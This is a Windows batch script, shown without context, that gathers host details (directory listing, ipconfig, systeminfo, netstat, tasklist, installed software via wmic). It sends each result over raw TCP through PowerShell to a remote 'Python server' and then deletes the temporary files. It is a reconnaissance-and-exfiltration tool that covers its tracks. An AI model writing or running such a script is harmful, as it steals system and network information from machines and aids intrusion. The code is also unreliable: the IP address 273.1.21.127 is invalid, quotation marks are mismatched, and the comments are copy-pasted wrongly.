@echo off

REM Run the dir command and save the output to a temporary file
dir > "%TEMP%\dir_output.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\dir_output.txt'; $client = New-Object System.Net.Sockets.Tcpclient(‘273.1.21.127", 1245); $stream = $client.Getstream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()”

timeout /t 5

REM Run the dir command and save the output to a temporary file
ipconfig > "%TEMP%\ipconfig.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\ipconfig.txt'; $client = New-Object System.Net.Sockets.Tcpclient(‘273.1.21.127", 1246); $stream = $client.Getstream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()”

timeout /t 5

REM Run the dir command and save the output to a temporary file
systeminfo > "%TEMP%\systeminfo.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\systeminfo.txt'; $client = New-Object System.Net.Sockets.Tcpclient(‘273.1.21.127", 1247); $stream = $client.Getstream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()”

timeout /t 5

REM Run the dir command and save the output to a temporary file
netstat > "%TEMP%\netstat.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\netstat.txt'; $client = New-Object System.Net.Sockets.Tcpclient(‘273.1.21.127", 1248); $stream = $client.Getstream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()”

timeout /t 5

REM Run the dir command and save the output to a temporary file
tasklist > "%TEMP%\tasklist.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\tasklist.txt'; $client = New-Object System.Net.Sockets.Tcpclient(‘273.1.21.127", 1249); $stream = $client.Getstream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()”

timeout /t 5

REM Run the dir command and save the output to a temporary file
wmic product get name, version > "%TEMP%\wmicc.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path '%TEMP%\wmicc.txt'; $client = New-Object System.Net.Sockets.Tcpclient(‘273.1.21.127", 1241); $stream = $client.Getstream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()”

timeout /t 5

REM Clean up the temporary file
del "%TEMP%\dir_output.txt"
del "%TEMP%\ipconfig.txt"
del "%TEMP%\systeminfo.txt"
del "%TEMP%\netstat.txt"
del "%TEMP%\tasklist.txt"
del "%TEMP%\wmicc.txt"

exit
